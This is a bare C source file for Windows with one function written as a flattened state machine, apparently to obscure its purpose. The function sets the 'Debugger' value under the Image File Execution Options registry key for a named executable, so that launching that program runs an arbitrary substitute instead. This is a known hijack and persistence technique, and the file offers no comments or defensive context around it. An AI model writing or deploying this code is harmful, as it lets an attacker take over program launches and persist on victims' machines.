#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v5(const char* t, const char* d){
    int s = 0;
    HKEY k;
    char p[256];
    while(s != -1) {
        switch(s) {
            case 0:
                wsprintfA(p, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s", t);
                s = 1;
                break;
            case 1:
                if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, p, 0, 0, 0, KEY_SET_VALUE, 0, &k, 0) == 0) s = 2;
                else s = -1;
                break;
            case 2:
                RegSetValueExA(k, "Debugger", 0, REG_SZ, (const BYTE*)d, lstrlenA(d));
                s = 3;
                break;
            case 3:
                RegCloseKey(k);
                s = -1;
                break;
        }
    }
}